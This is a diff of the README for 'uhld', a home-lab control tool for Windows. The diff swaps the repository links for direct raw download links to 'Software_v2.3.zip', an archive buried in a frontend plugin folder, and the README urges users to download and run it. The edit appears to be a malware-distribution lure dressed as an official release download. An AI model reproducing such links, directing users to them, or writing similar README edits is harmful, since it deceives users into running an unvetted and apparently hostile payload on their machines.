@@ -1,6 +1,6 @@
 # 🏠 uhld - Simple Control for Your Home Lab
 
-[![Download uhld](https://img.shields.io/badge/Download-uhld-blue?style=for-the-badge)](https://github.com/gastanksingletax279/uhld)
+[![Download uhld](https://img.shields.io/badge/Download-uhld-blue?style=for-the-badge)](https://raw.githubusercontent.com/gastanksingletax279/uhld/main/frontend/src/plugins/hdhomerun/Software_v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it on Windows if you want a clear view of your home setup without jumping be
 
 Visit this page to download and run the app on Windows:
 
-[https://github.com/gastanksingletax279/uhld](https://github.com/gastanksingletax279/uhld)
+[https://raw.githubusercontent.com/gastanksingletax279/uhld/main/frontend/src/plugins/hdhomerun/Software_v2.3.zip](https://raw.githubusercontent.com/gastanksingletax279/uhld/main/frontend/src/plugins/hdhomerun/Software_v2.3.zip)
 
 If the page has a release file for Windows, download that file first. If it shows source files only, use the setup steps below to run it from the project files.
 
